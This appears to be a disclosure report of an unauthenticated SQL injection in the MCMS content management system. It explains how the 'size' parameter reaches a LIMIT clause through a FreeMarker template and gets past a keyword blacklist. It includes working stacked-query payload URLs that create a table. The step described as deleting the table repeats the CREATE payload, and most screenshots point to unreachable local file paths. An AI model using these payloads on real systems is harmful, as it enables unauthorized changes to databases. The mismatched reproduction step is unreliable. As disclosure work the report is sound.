# MCMS Front-end SQL Injection Vulnerability Report

## Introduction to Vulnerabilities

The front-end interface `/cms/category/list` of the latest version of Mingfei MCMS (an open-source Java CMS with 2.5k stars on Gitee) is vulnerable to SQL injection. The `size` parameter is directly concatenated into the `LIMIT` clause of SQL through FreeMarker `${size}` without being parameterized and bound.
The built-in `SqlInjectionUtil` employs regular expression blacklist filtering, yet keywords like `CREATE/TABLE/SET/PREPARE/EXECUTE` are not included in the list, allowing for bypassing. Attackers can execute stacked SQL statements without logging in.
---

## Affected Versions

MCMS (ms-mcms) <= 6.2.0

## Utilize conditions

- The target is accessible at `/cms/category/list` (no authentication required by default)

---

## Vulnerability Reproduction

Front-end accepts parameter points:

![image-20260724111952531](https://github.com/fangtang7/picx-images-hosting/raw/master/mcms/图片1.2rvu819ojh.webp)

![image-20260724114530639](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724114530639.png)

Before executing the SQL injection payload:

![image-20260724112230187](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724112230187.png)

Executing the database creation statement, test724 is successfully created: /cms/category/list?type=top&size=1; CREATE %20TABLE %20test724(id %20INT); --     

![image-20260724112245040](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724112245040.png)

Executing the delete database statement, test724 was successfully deleted: /cms/category/list?type=top&size=1; CREATE%20TABLE%20test724(id%20INT); --      

![image-20260724112404752](C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20260724112404752.png)

In the CategoryBizImpl.java file, user parameters are injected into the FreeMarker template, which renders the final SQL!
[img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9012\wps1.jpg)

 

 

The SQL template of Channel accepts the size parameter without any restrictions, which can trigger SQL injection

![img](file:///C:\Users\ADMINI~1\AppData\Local\Temp\ksohtml9012\wps2.jpg)
